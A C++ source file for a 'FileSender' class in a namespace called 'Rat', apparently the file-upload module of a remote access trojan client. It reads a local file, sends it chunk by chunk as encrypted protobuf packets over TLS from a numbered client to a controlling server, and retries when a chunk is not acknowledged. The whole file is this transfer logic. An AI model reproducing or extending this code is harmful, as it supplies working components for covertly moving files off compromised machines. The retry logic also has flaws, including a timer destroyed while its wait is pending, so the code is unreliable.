#include "FileSender.hpp"
#include <iostream>

namespace Rat
{
    FileSender::FileSender(std::shared_ptr<boost::asio::ssl::stream<boost::asio::ip::tcp::socket>> socket,
                           NetworkManager &networkManager,
                           const uint64_t &client_id, const std::string &file_path)
        : socket_(socket),
          networkManager_(networkManager),
          client_id_(client_id),
          file_path_(file_path)
    {
        buffer_.resize(CHUNK_SIZE);
    }

    FileSender::~FileSender() {}

    void FileSender::sendFile(const std::string &file_path,
                              const std::string &file_id,
                              std::function<void()> on_finish,
                              std::function<void()> on_disconnect)
    {
        file_id_ = file_id;
        on_finish_ = std::move(on_finish);
        on_disconnect_ = std::move(on_disconnect);

        file_.open(file_path, std::ios::binary);
        if (!file_.is_open())
        {
            std::cerr << "[" << std::time(nullptr) << "] Cannot open file: " << file_path << "\n";
            return;
        }

        if (!socket_ || !socket_->lowest_layer().is_open() || !socket_->next_layer().is_open())
        {
            std::cerr << "[" << std::time(nullptr) << "] Socket not ready, need to reconnect\n";
            if (on_disconnect_)
            {
                on_disconnect_();
            }
            return;
        }

        file_.seekg(0, std::ios::end);
        std::streamsize total_size = file_.tellg();
        total_chunks_ = (total_size + CHUNK_SIZE - 1) / CHUNK_SIZE;
        file_.seekg(0);
        sequence_ = 0;

        std::cout << "[" << std::time(nullptr) << "] Debug all chunk: " << total_chunks_ << "\n";

        boost::asio::post(networkManager_.get_io_context(), [this]()
                          { this->processNextChunk(); });
    }

    void FileSender::processNextChunk()
    {
        // Check if enough chunks have been sent
        if (sequence_ >= total_chunks_)
        {
            std::cout << "[" << std::time(nullptr) << "] Finished sending file: " << file_id_ << "\n";
            file_.close();
            if (on_finish_)
            {
                on_finish_();
            }
            return;
        }

        // Read data from file
        file_.read(buffer_.data(), CHUNK_SIZE);
        std::streamsize bytes_read = file_.gcount();

        if (file_.fail() && !file_.eof())
        {
            std::cerr << "[" << std::time(nullptr) << "] File read error for file: " << file_id_ << "\n";
            file_.close();
            return;
        }

        // If no data can be read (EOF and bytes_read == 0), terminate.
        if (bytes_read <= 0)
        {
            std::cout << "[" << std::time(nullptr) << "] Finished sending file: " << file_id_ << "\n";
            file_.close();
            if (on_finish_)
            {
                on_finish_();
            }
            return;
        }

        // Prepare packet
        rat::Packet packet;
        packet.set_type(rat::Packet::TRANSFER_FILE);
        packet.set_packet_id(std::to_string(sequence_));
        packet.set_source_id("client_" + std::to_string(client_id_));
        packet.set_destination_id("server_0");
        packet.set_encrypted(true);
        packet.set_file_path(file_path_);
        auto *chunk = packet.mutable_chunked_data();
        chunk->set_data_id(file_id_);
        chunk->set_sequence_number(sequence_);
        chunk->set_total_chunks(total_chunks_);
        chunk->set_payload(buffer_.data(), bytes_read);
        chunk->set_success(true);

        std::cout << "[" << std::time(nullptr) << "] Debug sending chunk: " << sequence_ + 1 << " / " << total_chunks_
                  << " (" << (sequence_ + 1) / float(total_chunks_) * 100 << "%)" << "\n";

        // Send packet
        networkManager_.send(socket_, packet, [this](const boost::system::error_code &ec)
                             {
            if (ec) {
                std::cerr << "[" << std::time(nullptr) << "] Send failed: " << ec.message() << "\n";
                boost::asio::deadline_timer timer(networkManager_.get_io_context());
                timer.expires_from_now(boost::posix_time::seconds(1));
                timer.async_wait([this](const boost::system::error_code& timer_ec) 
                {
                    if (!timer_ec) 
                    {
                        boost::asio::post(networkManager_.get_io_context(), [this]() 
                        {
                            processNextChunk();
                        });
                    }
                });
                if (on_disconnect_) 
                {
                    on_disconnect_();
                }
                return;
            }

            // Wait ACK
            networkManager_.receive(socket_, [this](const rat::Packet& response, const boost::system::error_code& ec) 
            {
                if (ec || response.type() != rat::Packet::TRANSFER_FILE_ACK || !response.chunked_data().success()) 
                {
                    std::cerr << "[" << std::time(nullptr) << "] Server confirmation failed: " << (ec ? ec.message() : "Invalid ACK") << "\n";
                    boost::asio::post(networkManager_.get_io_context(), [this]() 
                    {
                        processNextChunk();
                    });
                    if (on_disconnect_)
                    {
                        on_disconnect_();
                    }
                    return;
                }

                sequence_++;
                std::cout << "[" << std::time(nullptr) << "] Debug received ACK for chunk: " << sequence_ << "\n";

                boost::asio::post(networkManager_.get_io_context(), [this]() 
                {
                    processNextChunk();
                });
            }); });
    }
} // namespace Rat